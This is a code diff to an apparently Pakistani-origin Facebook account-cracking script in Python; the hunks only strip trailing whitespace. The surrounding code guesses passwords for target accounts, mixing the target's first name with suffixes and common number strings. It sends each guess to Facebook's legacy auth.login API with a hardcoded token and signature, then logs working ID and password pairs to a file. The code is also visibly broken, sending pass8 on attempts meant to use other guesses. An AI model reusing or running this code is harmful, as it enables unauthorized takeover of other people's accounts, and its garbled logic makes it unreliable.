@@ -593,7 +593,7 @@ def pilih_super():
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)
 				                                                                                             
-else:						
+else:
 										                           pass10 = b['firs_name'] + 'kohat'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
@@ -616,7 +616,7 @@ else:
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass10)   	
 				                                                                                       
-else:						
+else:
 										                           pass11 = 'kohat123'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
@@ -638,7 +638,7 @@ else:
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass11+"\n")
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass11)   	
-										                                   else:						
+										                                   else:
 										                           pass12 = '786789'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
@@ -660,7 +660,7 @@ else:
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass12+"\n")
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass12)   	
-										                                   else:						
+										                                   else:
 										                           pass13 = '354344'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
@@ -682,7 +682,7 @@ else:
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass13+"\n")
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass13)   	
-										                                   else:						
+										                                   else:
 										                           pass14 = '9623734'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
@@ -704,7 +704,7 @@ else:
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass14+"\n")
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass14)   	
-										                                   else:						
+										                                   else:
 										                           pass15 = '9696296'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
